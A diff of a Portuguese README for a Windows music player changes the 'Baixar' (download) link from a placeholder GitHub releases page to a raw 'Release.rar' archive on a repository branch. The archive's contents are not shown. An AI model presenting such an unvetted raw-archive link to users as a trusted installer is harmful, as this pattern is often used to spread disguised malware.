@@ -8,7 +8,7 @@
 
 **Seu player de música para Windows: toque sua coleção, busque na internet e deixe tudo à mão.**
 
-[**Baixar**](https://github.com/SEU-USUARIO/SEU-REPOSITORIO/releases/latest) · [Funcionalidades](#funcionalidades) · [Como instalar](#como-instalar) · [Perguntas frequentes](#perguntas-frequentes)
+[**Baixar**](https://github.com/brunoCodds/sonora/raw/refs/heads/main/Release.rar) · [Funcionalidades](#funcionalidades) · [Como instalar](#como-instalar) · [Perguntas frequentes](#perguntas-frequentes)
 
 </div>
 
